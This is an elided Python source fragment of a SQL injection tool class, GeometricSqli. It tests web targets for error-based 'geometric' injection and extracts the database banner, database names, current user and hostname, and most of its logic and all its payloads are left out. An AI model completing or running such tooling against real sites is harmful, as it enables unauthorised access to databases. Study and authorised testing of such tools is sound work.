...
#######################################################
import os, re
from Payload.GeomtPayloads import *
from _compat import (
					compat_request,
					compat_urlerr,
					compat_urlopen,
...
class GeometricSqli:
					...
					if '0x72306f74' in tgt:
						...
						try:
							...
							if "Injected~" in respdata:
								Query_Test = True
								banner = respdata.split("Injected~")[1].split("~END")[0]
		...
		if self._url and not self._data:
			...
			for itr in range(init, total):
				...
				try:
					...
					respdata = resp.read()
					if "Injected~" in respdata:
						_dbn     = respdata.split("Injected~")[1].split("~END")[0]
						...
						if not DQuery:
							...
							if '0x72306f74' in tgt:
								...
								try:
									...
									respdata = resp.read()
									if "Injected~" in respdata:
										dbsName  = respdata.split("Injected~")[1].split("~END")[0]
										DQuery = True
										if not self._session:
				...
				try:
					...
					if not vul:
						...
						try:
							...
							if "Injected~" in respdata:
								vul = True
								retVal = respdata.split("Injected~")[1].split("~END")[0]
								# print retVal
								#  Creating Tables
								if not self._session:
	...
	def Banner(self):
		...
		try:
			...
			try:
				...
				print '\n' + compat_color.fw + compat_color.sb + "["+compat_strftime("%H:%M:%S")+"] [INFO] target is not vulnerable to error-based (GEOMETRIC) injection try other techniques.."
	...
	def Database(self):
		...
		try:
			...
			try:
				self.XpathInject(_flag, _colVersion, _name, CURRENTDB)
	...
	def User(self):
		...
		try:
			...
			PrevSession = sqlite.SessionShow(self._PathSession, _tableSession)
			 ...
			 # flag 	= _flag (basic)
			try:
				self.XpathInject(_flag, _colVersion, _name, CURRENTUSER)
	...
	def Host(self):
		...
		try:
			...
			PrevSession = sqlite.SessionShow(self._PathSession, _tableSession)
			 ...
			 # flag 	= _flag (basic)
			try:
				self.XpathInject(_flag, _colVersion, _name, HOSTNAMES)
